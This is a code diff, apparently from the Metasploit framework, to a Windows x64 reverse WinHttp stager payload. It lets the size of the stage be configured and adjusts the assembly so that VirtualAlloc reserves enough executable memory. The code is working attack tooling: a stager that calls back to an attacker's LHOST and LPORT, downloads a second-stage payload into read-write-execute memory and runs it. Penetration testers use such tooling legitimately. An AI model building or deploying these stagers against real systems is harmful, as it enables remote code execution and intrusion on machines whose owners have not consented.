@@ -31,7 +31,8 @@ module Payload::Windows::ReverseWinHttp_x64
     conf = {
       ssl:  opts[:ssl] || false,
       host: ds['LHOST'] || '127.127.127.127',
-      port: ds['LPORT']
+      port: ds['LPORT'],
+      size: ds['StagerStagePayloadSize'] || 0x400000
     }
 
     # Add extra options if we have enough space
@@ -197,6 +198,12 @@ module Payload::Windows::ReverseWinHttp_x64
     ie_proxy_flags = (
       0x00000001 | # WINHTTP_AUTOPROXY_AUTO_DETECT
       0x00000002 ) # WINHTTP_AUTOPROXY_CONFIG_URL
+
+
+    shift_size = 16
+    while opts[:size] > (0x40 << shift_size) do
+      shift_size += 1
+    end
 
     asm = %Q^
         xor rbx, rbx
@@ -570,7 +577,7 @@ module Payload::Windows::ReverseWinHttp_x64
         push 0x40
         pop rdx
         mov r9, rdx                   ; flProtect (0x40=PAGE_EXECUTE_READWRITE)
-        shl edx, 16                   ; dwSize
+        shl edx, #{"0x%.8x" % shift_size} ; dwSize
         mov r8, 0x1000                ; flAllocationType (0x1000=MEM_COMMIT)
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')} ; VirtualAlloc
         call rbp
@@ -614,4 +621,3 @@ module Payload::Windows::ReverseWinHttp_x64
 end
 
 end
-
